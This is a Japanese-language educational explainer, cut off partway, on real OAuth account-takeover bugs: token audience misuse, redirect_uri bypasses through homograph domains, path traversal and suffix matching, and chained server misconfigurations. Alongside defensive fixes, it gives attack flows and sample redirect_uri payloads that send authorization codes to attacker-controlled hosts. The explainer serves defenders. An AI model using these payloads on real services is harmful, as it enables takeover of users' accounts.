`auth.expo.io` を使うすべてのアプリが潜在的な対象で、Salt Labs は **Codecademy（約1億ユーザー）** をはじめ、Expo フォーラムから **34 社以上**の利用サービスを特定した。Facebook・Google・Twitter など、連携先アカウントへの波及も可能だった。

#### 修正

- 2023/2/18: ユーザー承認なしにクッキーを設定しないよう暫定緩和（報告当日対応）。
- 2023/2/26: `auth.expo.io` AuthSession Proxy サービス自体を**非推奨（deprecated）化**。
- 各利用組織は、脆弱なプロキシを使わないよう自身のデプロイを更新する必要があった。

開示タイムライン: 発見 2023/1/24、緩和 2/18、サービス廃止 2/26、CVE 公開 4/24、一般公開 5/24。

> 出典: A New OAuth Vulnerability Impacts Hundreds of Online Services — https://salt.security/blog/a-new-oauth-vulnerability-that-may-impact-hundreds-of-online-services

---

### 第3弾: Oh-Auth – Abusing OAuth to take over millions of accounts（2024年）

#### この記事が扱う本質的な欠陥

第3弾は、3 部作の中で最も「原理そのもの」に踏み込む。標的は **Grammarly・Vidio・Bukalapak** の 3 社だが、真の主題は **access token の受信側検証欠如**、すなわち **token audience（トークンが本来どのアプリ向けに発行されたか）の未確認**である。

まず、implicit（トークン直返し）方式のソーシャルログインの正常フローを押さえる。

```
1. ユーザーが「Sign in with Facebook」をクリック
2. Facebook へ:
   https://www.facebook.com/v3.0/dialog/oauth
     ?redirect_uri=https://randomsite.com/OAuth
     &client_id=1501
     &state=[random]
     &response_type=token
3. Facebook が「そのアプリ ID 専用の」access token を生成
4. 返送: https://randomsite.com/OAuth#token=[秘密トークン]&state=[random]
5. サイトが Graph API を呼ぶ:
   https://graph.facebook.com/me?fields=id,name,email&access_token=[秘密トークン]
6. Facebook がユーザーの identity（id/name/email）を返す
```

ここで決定的なのは、**Facebook が発行する access token は「特定のアプリ ID（App ID）専用」である**という事実だ。Facebook の公式ドキュメントは、開発者が token を受け入れる前に **`debug_token` API** を使って検証することを義務付けている。この検証を怠り、「トークンで Graph API を呼べたから本人だ」と判断すると、**別アプリ向けのトークンでも通ってしまう**。

> なぜ audience 検証が必須なのか: OAuth の access token は「誰が（ユーザー）」「どのアプリに（App ID = audience）」「何を許可したか」を束ねた資格情報である。受信側が audience（App ID）を確認しないと、攻撃者が**自分のアプリ**でユーザーから正規に取得したトークンを、**別のサービス**に持ち込んで「このユーザー」として振る舞える。トークン自体は本物なので、単に Graph API が成功したかどうかでは真贋を判定できない。`debug_token` はトークンに紐づく App ID を返すため、それが自分の App ID と一致するかで audience を検証できる。

#### 攻撃手順（トークンの使い回し）

```
Step1（トークン収集）: 攻撃者が正規の OAuth 連携を備えた偽サイト
  （例: YourTimePlanner.com, App ID 328...）を用意。
  訪問ユーザーが Facebook ログインすると、攻撃者の App ID 向けトークンが発行される。

Step2（トークン再利用）: 攻撃者は集めたユーザートークンを、脆弱なサイトの
  ログインエンドポイントに送り込む。受信側が App ID を検証しないため、
  「そのユーザー」としてログインが成立する。
```

前提条件は「被害者が一度は攻撃者サイトで Facebook ログインしていること」「被害者が同じ email で対象サービスにアカウントを持つこと」。それ以降は追加操作なしで乗っ取れる。

#### サイト別の詳細

**Vidio.com（月間1億ユーザー）**
- エンドポイント: `/api/facebook/auth`
- 欠陥: token audience の未検証。
- 攻撃: YourTimePlanner（App ID 328..）で得たトークンを、App ID 92356 を期待する Vidio に送信 → 完全な乗っ取り成立。

**Bukalapak.com（1.5億ユーザー）**
- エンドポイント: `accounts.bukalapak.com` の `/fb_login`
- 欠陥: トークン検証の欠如。EC プラットフォームの個人・金融情報にアクセス可能。
- 修正後: 二次防御として **OTP（ワンタイムパスワード）** を追加。

**Grammarly.com（日次3000万ユーザー）**
- 方式: implicit ではなく **認可コードフロー**（本来より安全で、直接 token ではなく code を使う）。
- 二次的欠陥: バックエンドが**別名のパラメータ**を受け入れていた。
- 攻撃: POST リクエストの `code` を `access_token` パラメータに差し替えると通った。総当たりで `tokens`, `facebookToken`, `FBToken`, `access_token`（成功）などを試し、受理される名前を発見。
- API: `https://auth.grammarly.com` がパラメータ操作に対して脆弱。ドキュメント閲覧を含む被害者データが露出。

> なぜ Grammarly が「本来安全なコードフロー」でも破れたのか: 認可コードフローは「ブラウザに token を出さず、code をサーバー間交換で token に変える」ため implicit より堅い。しかしバックエンドが「code でも access_token でも受け付ける」寛容な実装だと、implicit の弱点（audience 未検証のトークン受理）を裏口から呼び込んでしまう。**受け付ける入力の種類を仕様どおりに厳格化する**ことがいかに重要かを示す好例である。

#### 影響と規模

3 社合計で数億ユーザー規模が対象。Salt Labs は、同種の欠陥を抱えるサイトは**さらに数千**存在し、「追加で数十億のインターネットユーザーがリスクにさらされている」と推定した。

修正時期: Vidio 2023/6/15、Bukalapak 2023/6/16、Grammarly 2023/7/13。一般公開は 2023/10/24。

解決策は以下のとおり。

1. トークンの audience（App ID）を自分のアプリ ID と照合する。
2. Facebook の `debug_token` API を呼んで明示的に検証する。
3. 受け付ける OAuth パラメータを、ドキュメント記載の仕様に限定する（別名を受理しない）。

> 出典: Oh-Auth – Abusing OAuth to take over millions of accounts — https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts

---

### 3部作から学ぶ防御原則

3 本を横断すると、ソーシャルログインを実装する側が守るべき原則が浮かび上がる。

- **redirect_uri は完全一致で検証する。**（第1弾）オリジンやパスのプレフィックス一致で妥協せず、登録済み URL と厳密一致させる。ユーザー入力（`resultUri` 等）を交換時の `redirect_uri` に使わない。
- **`state` に遷移先 URL を詰めない／詰めるなら受信側でホワイトリスト検証する。**（第1弾）`state` は不透明な CSRF トークンであって、オープンリダイレクトの運び手にしない。
- **信頼境界（ユーザー承認）を越える前に、ユーザー入力を永続化しない。**（第2弾）`returnUrl` のような転送先はユーザー確認後に確定し、URL 検証は大文字小文字・エンコードの正規化まで行う。
- **受け取った access token は必ず audience を検証する。**（第3弾）`debug_token` 等で「そのトークンが自分の App ID 向けか」を確認する。Graph API が成功したことは本人性の証明にはならない。
- **受け付けるパラメータ名・種類を仕様どおりに厳格化する。**（第3弾）`code` を期待する口に `access_token` が通るような寛容さは、より安全なフローを台無しにする。

これらはいずれも「外部プロバイダから受け取ったものを、無検証で信頼しない」という一点に集約される。OAuth は認可を委任する仕組みであって、委任先からの応答を鵜呑みにしてよいという意味ではない、というのが Salt Labs 3 部作の一貫したメッセージである。

## 公開 HackerOne レポートで見る redirect_uri 検証の崩れ

OAuth 2.0 の認可コードフロー（Authorization Code Flow）において、`redirect_uri`（認可サーバーがユーザーを認可後に送り返す戻り先URL）の検証は、フロー全体のセキュリティを支える最後の砦の一つである。認可サーバーがこのパラメータを厳密に検証しないと、攻撃者は自分が管理するサーバーへ認可コード（authorization code、後でアクセストークンと交換する一時的な引換券）や、場合によってはアクセストークン自体を横流しさせることができる。

本節では、実際に公開された3件の HackerOne レポートを題材に、「一見もっともらしい検証ロジック」がどのように崩れるかを、原理レベルで掘り下げる。取り上げるのは、(1) IDN（国際化ドメイン名）ホモグラフ攻撃による Semrush の事例、(2) パストラバーサルによる pixiv の事例、(3) ドメインサフィックス/サブドメイン一致による Slack の古典事例、の3パターンである。いずれも「文字列比較のロジックとURLパーサ／ブラウザの実際の解釈がズレている」という共通の本質を持つ。

> ⚠️ **アクセス上の注記**: 3件とも HackerOne の該当レポートページ自体は JavaScript によるクライアントサイドレンダリングのため、自動取得ツールでは本文HTMLが空（ヘッダーの「HackerOne」という文字列のみ）として返り、レポート本文を直接引用することはできませんでした。そのため本節の技術内容は、各レポートを報告した研究者自身の告知（X/Twitter投稿など）や、HackerOne の公開レポートをまとめた各種ミラー・データベース（Vulners、GitHub上の disclosed-reports 集計リポジトリなど）、および同種の脆弱性を扱う技術記事を横断して裏取りした情報に基づく。金額・日付など数値情報は検索結果に基づく二次情報であるため、正確な一次情報を確認したい場合は各URLを直接参照してほしい。

---

### 事例1: Semrush — IDN ホモグラフ攻撃による redirect_uri バイパス

> 出典: Semrush disclosed on HackerOne: OAuth `redirect_uri` bypass using IDN homograph attack — https://hackerone.com/reports/861940

#### 何が起きたか

報告者 yassineaboukir は、2020年6月18日付で Semrush の OAuth 実装に対し、IDN（Internationalized Domain Name、非ASCII文字を含む国際化ドメイン名）のホモグラフ（見た目がそっくりな別文字）を悪用することで `redirect_uri` の許可リスト検証をすり抜けられることを報告した。CVSS スコアは 6.4（中程度）、報奨金は260ドルとされる。

問題の核心は、Semrush 側の検証ロジックが「文字列としての比較」しか行っておらず、ホスト名に含まれる文字がラテン文字（ASCIIのアルファベット）なのか、見た目だけ似た別のUnicode文字（キリル文字やギリシャ文字など）なのかを区別していなかった点にある。たとえばキリル文字の「е」(U+0435, キリル小文字イエー)は、ラテン文字の「e」(U+0065)と画面上ではほぼ区別がつかない。しかしコンピュータ内部では全く別のコードポイントであり、当然ながら別のドメインとして解決される。

攻撃者は、`sémrush.com`、`sêmrush.com`、`sèmrûsh.com`、あるいはキリル文字を混在させた `šemrush.com` のような「見た目はSemrushそっくりだが実際には第三者が取得可能な文字列」のドメインを取得できる。これらは Punycode（IDNをASCIIで表現するエンコーディング規格）に変換すると `xn--emrush-9jb.com` のような形になる。

```
正規のドメイン:      semrush.com
攻撃者のドメイン(見た目):  sémrush.com  /  šemrush.com
攻撃者のドメイン(実体):    xn--smrush-xxx.com (Punycode表現)
```

Semrush 側は許可リストに `semrush.com` を含むドメインしか登録していなかったはずだが、検証コードが単純な部分一致や末尾一致（サフィックスマッチ）で `redirect_uri` のホスト名を確認していたと推測され、Unicode正規化（NFC/NFKCなど、見た目が同じ複数の文字表現を統一する処理）や「許可リストに登録された文字列とバイト単位で完全一致するか」というチェックが欠落していたため、ホモグラフドメインへの `redirect_uri` を許してしまったと考えられる。

#### 攻撃フロー

```
1. 攻撃者が oauth.šemrush.com (実際はPunycodeのxn--...ドメイン) を取得する
2. 攻撃者はSemrushの認可エンドポイントへのリンクを作る:
   https://www.semrush.com/oauth/authorize
       ?client_id=<正規のclient_id>
       &redirect_uri=https://oauth.šemrush.com/callback
       &response_type=code
       ...
3. 被害者がログイン済みの状態でこのリンクを踏み、「アプリを許可」を押す
4. 認可サーバーはredirect_uriのホスト名検証を(見た目上の一致だけで)通過させてしまい、
   認可コードを付与したままoauth.šemrush.com へリダイレクトする
5. 攻撃者はそのドメインで認可コード(場合によってはアクセストークン)を受け取る
```

#### なぜこの検証ロジックが崩れるのか(仕組みレベル)

これはブラウザとサーバーで「ドメイン名の同一性」の判断基準が食い違う典型例である。ブラウザのアドレスバー表示や、サーバー側の緩い文字列比較は「見た目」で判断しがちだが、DNS解決やTLS証明書検証は「Punycodeにエンコードされた実際のバイト列」で行われる。つまり `sémrush.com` は DNS的には `semrush.com` とは完全に無関係の、攻撃者が自由に取得できるドメインである。

このため、`redirect_uri` の検証で本来必要なのは以下のような処理である。

- 受け取った `redirect_uri` のホスト名をUnicode正規化した上で、事前に登録された文字列と**完全一致**(前方一致・部分一致・サフィックス一致ではなく)で比較する。
- 可能であれば、非ASCII文字を含むホスト名(Punycodeエンコードが必要なホスト名)そのものを許可リストの対象外にする、あるいは登録時に明示的な確認を要求する。
- ブラウザによってはIDNをそのまま表示せずPunycode表示に切り替える機能があるが、サーバー側のバリデーションをそれに依存してはならない。あくまでサーバー側で完全一致検証を行うことが必須。

#### 影響と教訓

この脆弱性の影響は、被害者の認可コード(ひいてはアクセストークン)が攻撃者のドメインへ流出することであり、攻撃者はそのトークンでAPIを叩いて被害者のSemrushアカウントの情報を取得・操作できる可能性がある。CVSS 6.4という中程度のスコアは、フィッシング的要素(被害者が「許可」ボタンを押す必要がある)を反映したものと考えられる。

教訓としては、「許可リスト方式のredirect_uri検証」は堅牢に見えて、比較アルゴリズムの実装次第で容易に崩れるという点である。文字列比較は必ず正規化後の完全一致で行い、国際化ドメイン名という「人間の目を騙す」攻撃ベクトルの存在を前提に設計する必要がある。

---

### 事例2: pixiv — redirect_uri のパストラバーサルによる認可コード窃取

> 出典: Stealing Users OAuth authorization code via path traversal in redirect_uri — https://hackerone.com/reports/1861974

#### 何が起きたか

このレポートは、pixiv の OAuth 実装において、`redirect_uri` パラメータに**パストラバーサル**(`../` のようなパス上位階層への移動表現を使い、意図しないパスへアクセスさせる手法)を含めることで、ホスト名の検証(許可リストに登録済みの正規ドメイン・パス)を通過しつつ、最終的にブラウザが解決する先を攻撃者の管理するパスへずらす、という手口である。

典型的なペイロードの形は次のようなものである。

```
redirect_uri=https://app.example.com/callback/../attacker
```

このURLは文字列としては `https://app.example.com/callback/` から始まっており、サーバー側のバリデータが「登録済みの `https://app.example.com/callback` で始まっているか(前方一致)」という緩い判定をしていた場合、このチェックを通過してしまう。しかし、ブラウザ(あるいはHTTPクライアント)が実際にこのURLへリクエストを送る際には、URL正規化(RFC 3986で定義されたパスセグメントの解決処理)が行われ、`/callback/../attacker` という表現は `/attacker` に解決される。つまり実際にリクエストが飛ぶ先は `https://app.example.com/attacker` であり、`/callback` というパスは影も形もなくなっている。

```
サーバーの検証: "https://app.example.com/callback" で始まっているか? → YES(素通り)
ブラウザの実解決: https://app.example.com/callback/../attacker
                 → パスセグメント正規化 → https://app.example.com/attacker
```

もし `https://app.example.com/attacker` というパスが、アプリケーション側で攻撃者が自由に内容を書き換えられるエンドポイント(たとえばオープンリダイレクトを起こすエンドポイントや、攻撃者が制御できるユーザーコンテンツ配信パスなど)であれば、そこに認可コードを含んだクエリパラメータ(`?code=...`)が届く。攻撃者はそのエンドポイントのログやレスポンスから認可コードを回収し、pixivのトークンエンドポイントで正規のクライアント認証情報を使って(あるいはPKCEが無い実装であれば単純に)アクセストークンと交換できてしまう。

このレポートは pixiv 側で244アップボートを集め、2,000ドルの報奨金が支払われたとされる、代表的な「path traversal via redirect_uri」の事例として知られている。

#### なぜこの検証ロジックが崩れるのか(仕組みレベル)

この脆弱性の本質は、**「検証時の文字列」と「実際に使用される時の解決済みURL」が異なるオブジェクトである**という事実を、実装者が見落としている点にある。

多くの `redirect_uri` バリデータは、次のような実装のどちらかに陥りがちである。

1. **文字列としての前方一致・部分一致だけで判定する**: この場合、`../` を含むペイロードで正規化前の文字列上は「登録済みURLで始まっている」ように見えてしまう。
2. **URLをパースしてホスト名だけを比較し、パス部分は無視する**: この場合はそもそもパストラバーサルの余地がホスト名レベルでは生まれないが、パスに機密なアクション(たとえば `/callback` の実装がステートを検証する場所)が紐づいている設計だと、パスの改変自体が攻撃面になる。

正しい検証は、受け取った `redirect_uri` を一度URLパーサで完全にパース・正規化(パスセグメントの `.` や `..` を解決)した「結果としての文字列」を、登録済みのURLとバイト単位で完全一致させることである。前方一致や部分一致という「甘い」比較方式そのものが、この種の攻撃を成立させる土壌になっている。

```
❌ 危険な検証(疑似コード):
if redirect_uri.startswith(registered_uri):
    allow()

✅ 安全な検証(疑似コード):
normalized = urllib.parse.urljoin(redirect_uri, ".")  # または正規のURL正規化処理
if normalized_and_fully_resolved(redirect_uri) == registered_uri:  # 完全一致のみ
    allow()
```

さらに堅牢な設計としては、`redirect_uri` は事前登録された値と**完全一致**でしか許可しない(ワイルドカードや前方一致を一切使わない)という OAuth 2.0 Security Best Current Practice (RFC 9700 の前身である draft、および OAuth 2.0 for Native Apps の RFC 8252 でも推奨されている exact match 方式)に従うべきである。

#### 影響と教訓

この手法が危険なのは、開発者が「うちは `redirect_uri` を許可リストでちゃんとチェックしているから安全」と思い込んでいても、そのチェック自体のアルゴリズムに穴があれば無意味になる、という点を突いているからである。特にパストラバーサルは、Webアプリケーション全般でよく知られた古典的な脆弱性パターンだが、OAuthの `redirect_uri` 検証という文脈に置き換わると見落とされやすい。

対策としては、前述の完全一致検証に加え、認可コードの寿命を極めて短くする、PKCE(Proof Key for Code Exchange、認可コードを横取りされてもトークン交換時に検証用のシークレットが無いと使えなくする仕組み)を必須化する、といった多層防御が有効である。PKCEについては本教科書の別章で詳しく扱う。

---

### 事例3: Slack — ドメインサフィックス／サブドメイン一致による古典的バイパス

> 出典: Slack | Report #2575 - Slack OAuth2 "redirect_uri" Bypass — https://hackerone.com/reports/2575

#### 何が起きたか

この報告(報告者 prakharprasad)は、2014年3月13日付で解決済み(Resolved)となり、同年5月29日に一般公開に同意されたとされる、OAuth `redirect_uri` バイパス手法の中でも最も古典的かつ広く知られたパターンの一つである。Instagram の OAuth 実装でも同種の問題が独立に見つかったことがあるとされ、「ドメインサフィックス/サブドメインマッチ」問題として広く言及されている。

登録された `redirect_uri` が `http://www.google.com` だった場合、次のような値を `redirect_uri` に指定しても認可サーバーに受理されたという。

```
登録済みredirect_uri:        http://www.google.com
バイパスに使われたredirect_uri1: http://www.google.com.mx
バイパスに使われたredirect_uri2: http://www.google.com.attacker.com
```

一見するとどちらも「www.google.com」という文字列を含んでいるが、実際にはまったく別のホストである。`www.google.com.mx` はGoogleのメキシコ向けドメインであり(この例では偶然実在のドメインだが、任意の第三者が取得できる `www.google.com.evil.tld` のような形であれば完全に攻撃者の管理下に置ける)、`www.google.com.attacker.com` に至っては明確に `attacker.com` というドメインのサブドメインであり、攻撃者が完全に制御できる。

#### なぜこの検証ロジックが崩れるのか(仕組みレベル)

この脆弱性は、`redirect_uri` の検証を「文字列の**前方一致**」あるいは「登録済み文字列を**含んでいるかどうか**」という緩いロジックで行った結果として生まれる、非常によくあるパターンである。

```
❌ 危険な検証(疑似コード): 前方一致
if redirect_uri.startswith("http://www.google.com"):
    allow()
    # → "http://www.google.com.attacker.com" もマッチしてしまう

❌ 危険な検証(疑似コード): サフィックスの緩い判定
if "google.com" in hostname:
    allow()
    # → "www.google.com.attacker.com" の中に "google.com" という部分文字列が
    #   含まれるためマッチしてしまう(ただしこれは意味のあるサフィックスではない)
```

ここで理解すべき仕組みレベルの原理は、**ドメイン名の階層構造とラベル境界**である。DNSのホスト名は右から左に「トップレベルドメイン(TLD)→セカンドレベルドメイン→サブドメイン」という階層(ラベル)で構成されており、`www.google.com.attacker.com` というホスト名の「本当の所有者」は右端から数えて `attacker.com` である。つまりこのホスト名は `attacker.com` というドメインの管理者が自由に発行できるサブドメイン `www.google.com` (ラベルとしての文字列が偶然Googleのそれと同じであるだけ)に過ぎない。

前方一致や「文字列に含まれるか」という判定は、このラベル境界(ドット区切りの意味的な階層構造)を一切考慮しない、純粋なバイト列の比較に過ぎない。そのため、`www.google.com` という文字列がホスト名のどこか(特に先頭)に現れさえすれば、それが本物のGoogleのドメインなのか、単に見た目を似せた別ドメインのサブドメイン・ラベルなのかを区別できない。

正しい検証は次のいずれか(できれば両方)である。

1. **完全一致検証**: 事前登録された `redirect_uri` の文字列(スキーム・ホスト・ポート・パスすべて)と、リクエストで渡された `redirect_uri` がバイト単位で完全に一致するかだけを見る。ワイルドカードや部分一致は一切使わない。
2. **ホスト名を構造的に比較する**: どうしてもサブドメインを許可する必要がある特殊な設計(通常は推奨されない)であっても、単純な文字列比較ではなく、ホスト名をラベル単位に分解し、末尾のラベル列が完全に一致するか(かつラベル境界を跨がないか)を検証する。

```
✅ 安全な検証(疑似コード):
if redirect_uri == registered_uri:  # スキーム・ホスト・ポート・パス全て完全一致
    allow()
else:
    deny()
```

#### 影響と教訓

この手法の影響は、事例1・事例2と同様、攻撃者が用意したドメインへ認可コードやアクセストークンをリダイレクトさせ、被害者のアカウントを乗っ取ることである。2014年という時期の早さからも分かる通り、この「サフィックス/サブドメインマッチ」問題はOAuthの `redirect_uri` バイパスの中でも最も基礎的かつ歴史の長いパターンであり、以降のOAuthセキュリティのベストプラクティス(前方一致や部分一致を禁止し、完全一致のみを許可する)が策定される直接のきっかけの一つになったとされる。

現在の OAuth 2.0 Security Best Current Practice や各種プロバイダのガイドラインでは、`redirect_uri` の検証は原則として**登録済みURLとの完全一致(exact string match)**のみとし、ワイルドカードドメインやパスの部分一致を許可しないことが明確に推奨されている。もし複数のサブドメインやパスへのリダイレクトが業務上どうしても必要な場合は、`redirect_uri` 自体を汎用化するのではなく、認可コードを受け取る専用の中継エンドポイントを一つだけ用意し、そこから内部的に適切な宛先へ転送する設計が望ましい。

---

### 3事例に共通する原理のまとめ

| 事例 | 崩れた検証方式 | 実際の解決結果とのズレ |
|---|---|---|
| Semrush(IDNホモグラフ) | 見た目上の文字列比較 | Unicode上の別コードポイントが同一に見える |
| pixiv(パストラバーサル) | 正規化前の前方一致 | `../` はブラウザ/クライアントによるパス正規化で別パスに解決される |
| Slack(サフィックス一致) | 部分一致・前方一致 | ドメインのラベル境界を無視した文字列比較 |

3件に共通するのは、**「認可サーバーが `redirect_uri` を検証する時点での文字列」と「実際にHTTPリクエストが送られる時点で解決される値」が一致するとは限らない**という前提を欠いた実装である。防御側の結論は一貫している。すなわち、`redirect_uri` の検証は必ず以下を満たすべきである。

- URLを正規化(パーセントエンコード解除、パスセグメント解決、Unicode正規化)した**後**の値で比較する。
- 前方一致・部分一致・サフィックス一致を一切使わず、事前登録済みの値との**完全一致**のみを許可する。
- 可能な限り、認可コード窃取が成立しても実害が出ないよう、PKCEの必須化や認可コードの短寿命化・ワンタイム化といった多層防御を組み合わせる。

これらの原理は次節以降で扱う他の公開事例でも繰り返し登場する、OAuthセキュリティの最重要ポイントの一つである。

## 設定不備の連鎖によるアカウント乗っ取りのライトアップ

このセクションでは、OAuth 2.0 / OpenID Connect の実装における「単体では致命的に見えない小さな設定不備」が複数連鎖することで、最終的にアカウント乗っ取り（Account Takeover, 以下 ATO）へ至る実例を、公開されたバグバウンティのライトアップ 3 本から読み解く。狙いは攻撃手順の再現ではなく、**なぜその設定不備が成立し、なぜ連鎖すると致命傷になるのか**という原理を、プロトコルとサーバ実装のレベルで理解し、防御側として同種の欠陥を自分のシステムから排除できるようになることである。

本セクションで扱う 3 本は、いずれも「複数の弱点の合わせ技」という共通構造を持つ。

- 記事1: 動的クライアント登録（open client registration）＋ PKCE の認証省略＋ワイルドカード CORS ＋ Google SSO の自動プロビジョニングが連鎖した「認可コード横取り型」の ATO。
- 記事2: Bugcrowd の複数プログラムで見つかった 5 種類の OAuth 設定不備による「事前アカウント乗っ取り（pre-account takeover, 未登録の被害者の枠を先取りする攻撃）」。
- 記事3: Facebook OAuth を使ったログインで、アプリ側がプロバイダから返る**メール検証状態を信頼しすぎた**ことによる完全 ATO。

> ⚠️ **取得に関する注記**: 3 本の一次資料はいずれも Medium 上にあり、直接取得（WebFetch）は HTTP 403（アクセス拒否）でブロックされた。記事1はミラー（daily.dev の要約ページ）と検索結果から実質的な技術内容を復元できたため本文に反映している。記事2・記事3は検索結果の要約のみが得られ、本文・具体的なリクエスト値までは自動取得できなかった。該当箇所に個別の未取得注記を付し、一般知識に基づく補足で原理を補っている。

---

### 前提知識のおさらい: 連鎖を理解するために必要な 4 つの部品

本セクションの事例を読む前に、以下の 4 つの概念を押さえておく。いずれも「単体では正しい設計」だが、組み合わせを誤ると穴になる。

#### 認可コードフローと `redirect_uri`

OAuth 2.0 の**認可コードフロー**（authorization code flow）では、次の流れでトークンを取得する。

1. クライアント（アプリ）が認可サーバの `/authorize` に利用者を送り出す。このとき `client_id`（アプリ識別子）、`redirect_uri`（認可後の戻り先）、`scope`（要求権限）、`state`（CSRF 対策の乱数）などを付ける。
2. 利用者が同意すると、認可サーバは `redirect_uri` に**認可コード**（authorization code, 短命の一時引換券）を付けてリダイレクトする。
3. クライアントがそのコードを `/token`（トークンエンドポイント）へ送り、**アクセストークン / ID トークン**に交換する。

ここで最重要なのが `redirect_uri` の**厳密一致検証**だ。認可コードはこの URI にしか送られない。もし認可サーバが `redirect_uri` を緩く検証すれば（前方一致・部分一致・任意ドメイン許可）、**コードが攻撃者のサーバへ配送される**。これが「認可コード横取り（authorization code interception）」の根源である。

#### PKCE（Proof Key for Code Exchange）

PKCE（RFC 7636、「ピクシー」と読む）は、公開クライアント（モバイルアプリや SPA のように**クライアントシークレットを安全に秘匿できない**クライアント）向けの、認可コード横取り対策である。仕組みは次のとおり。

1. クライアントが乱数 `code_verifier` を生成し、そのハッシュ `code_challenge = SHA256(code_verifier)` を `/authorize` に付ける。
2. `/token` でコードを交換するとき、元の `code_verifier` を提示する。
3. 認可サーバは `SHA256(code_verifier)` が最初の `code_challenge` と一致するか検証する。一致しなければ拒否。

これにより、**コードを盗んでも `code_verifier` を知らない攻撃者はトークンに交換できない**。PKCE は「コードとトークン交換を同一クライアントに縛り付ける」仕組みだと理解するとよい。

#### クライアント認証（`client_secret`）と `token_endpoint_auth_method`

コンフィデンシャルクライアント（サーバサイドで秘密を保持できるアプリ）は、`/token` で `client_secret` によるクライアント認証を行う。公開クライアントは秘密を持てないので `none`（認証なし）を使い、代わりに PKCE で守る。認可サーバのメタデータ（`/.well-known/openid-configuration` など）には、どの方式を受け付けるかが `token_endpoint_auth_methods_supported` として公開される。例:

```json
{
  "token_endpoint_auth_methods_supported": ["none", "client_secret_post"]
}
```

`"none"` が含まれる＝**シークレットなしのトークン交換を認めている**。これ自体は公開クライアントの正規動作だが、後述するように他の不備と組むと危険になる。

#### 自動プロビジョニングと SSO によるアカウント紐付け

多くのサービスは「Google/Facebook でログイン」を実装するとき、**プロバイダが返したメールアドレスをキーに既存アカウントへ紐付け、なければ自動作成（auto-provisioning）**する。ここで、

- プロバイダのメールが**検証済み（`email_verified: true`）**か確認しない、
- あるいは**メール一致だけで既存アカウントに合流させる**

という実装をすると、攻撃者が用意した OAuth アイデンティティが被害者アカウントへ結び付いてしまう。これが事前アカウント乗っ取りとメール信頼問題の共通原因である。

---

### 記事1: 動的クライアント登録・PKCE・CORS・自動プロビジョニングの四重連鎖

> 位置づけ: Shafayat Ahmed Alif「How I Found a Critical OAuth Misconfiguration That Led to Account Takeover」(2026年6月)。認可サーバに**誰でもクライアントを登録できる**動的クライアント登録の穴があり、そこに `redirect_uri` の緩い検証、`none` を許すトークンエンドポイント、ワイルドカード CORS、そして Google SSO の自動プロビジョニングが重なって ATO に至った事例。

#### 連鎖する 5 つの不備

このライトアップの核心は、単体では「仕様上許される」挙動が、5 つ重なると致命傷になるという点にある。

1. **認証なしの動的クライアント登録（open/unauthenticated client registration）**
   認可サーバのクライアント登録エンドポイントが認証を要求せず、**攻撃者が自分の OAuth クライアントを自由に登録できた**。登録時に任意の `redirect_uri` を指定できたことが特に危険。
2. **任意 `redirect_uri` の受理**
   登録時・認可時ともに `redirect_uri` を厳密検証せず、攻撃者ドメインを戻り先にできた。これで認可コードが攻撃者サーバへ配送される下地ができる。
3. **認証なしで処理される `/authorize`**
   認可エンドポイントが「まず利用者を認証してから同意を求める」のではなく、未認証のリクエストをそのまま処理してしまう挙動があった（本来は未認証なら 401 やログイン画面へ誘導すべき）。
4. **PKCE がクライアントシークレットを要求しない（`none` 許可）**
   メタデータに `"token_endpoint_auth_methods_supported": ["none", "client_secret_post"]` があり、**シークレットなしでコードをトークンに交換できた**。攻撃者が登録した公開クライアントでも、コードさえ手に入れればトークン化できる。
5. **ワイルドカード CORS（`Access-Control-Allow-Origin: *` 相当）**
   任意のオリジンからクロスオリジン要求を発行してレスポンスを読めた。CORS 単体では ATO にならないが、**攻撃者ページから認可サーバ／API のレスポンスを読み取れる**ため、コードやトークンを JavaScript で回収する攻撃面が大きく広がる。

これに加えて **Google SSO の自動プロビジョニング**が存在し、OAuth アイデンティティからサービス側アカウントが自動生成・紐付けされる構造だった。

#### なぜ連鎖すると ATO になるのか（原理）

攻撃の骨子は「攻撃者が正規に見える OAuth クライアントを登録し、被害者に同意させて認可コードを奪い、それをトークンに換えて被害者になりすます」ことである。防御目的の理解として、各不備が担う役割を分解する。

- 動的クライアント登録の穴（不備1）で、攻撃者は**認可サーバに信頼される `client_id` を自前で得る**。通常はクライアント登録は運営が管理する高信頼な操作なので、ここが開いている時点で信頼境界が崩れている。
- `redirect_uri` の緩さ（不備2）で、**認可コードの配送先を攻撃者が握れる**。厳密一致検証があればここで止まる。
- PKCE の `none` 許容（不備4）で、**盗んだ／受け取ったコードをシークレットなしでトークン化できる**。本来 PKCE は「コードを盗んでもトークンにできない」ための機構だが、`code_verifier` 検証を伴わない `none` フローが通ると意味をなさない。
- CORS のワイルドカード（不備5）で、**攻撃者の Web ページから認可・トークン応答を読み取れる**ため、リダイレクトを介さずブラウザ内でコード/トークンを回収する経路まで開く。

結果として攻撃者は、消費者を欺いて同意させれば認可コード → JWT（JSON Web Token 形式のトークン）を取得し、**被害者として完全になりすます**ことができた。ライトアップは「クライアント認証なしのトークン交換は公開クライアントでは技術的に許容されるが、**登録が開いている環境と組むと危険**になる」と、まさに連鎖の本質を指摘している。

#### 防御（このライトアップが挙げる対策）

- **クライアント登録に認証を要求する**。動的登録を使うなら RFC 7591 の登録アクセストークン等で保護し、任意の第三者が登録できないようにする。
- **`redirect_uri` を厳密一致（完全一致）で検証する**。ワイルドカードや前方一致を避け、事前登録済みの URI のみ許可。
- **未認証の `/authorize` へは 401 を返す**か、確実にログインを挟む。未認証のまま同意フローを進めない。
- **ワイルドカード CORS を廃し、明示的な許可リスト（allowlist）に置き換える**。特に認可/トークン系エンドポイントは資格情報を含む応答を返すため、`*` は厳禁。
- 公開クライアントで `none` を許すなら **PKCE（S256）の検証を必須化**し、`code_verifier` 未提示・不一致は必ず拒否する。

> 出典: How I Found a Critical OAuth Misconfiguration That Led to Account Takeover (Shafayat Ahmed Alif) — https://medium.com/@iamshafayat/how-i-found-a-critical-oauth-misconfiguration-that-led-to-account-takeover-abfec43eaea6 （原文は Medium で 403 のため、内容は daily.dev ミラー https://daily.dev/posts/how-i-found-a-critical-oauth-misconfiguration-that-led-to-account-takeover-ufuy7nxrv および検索結果から復元）

---

### 記事2: 5 種類の OAuth 設定不備による事前アカウント乗っ取り

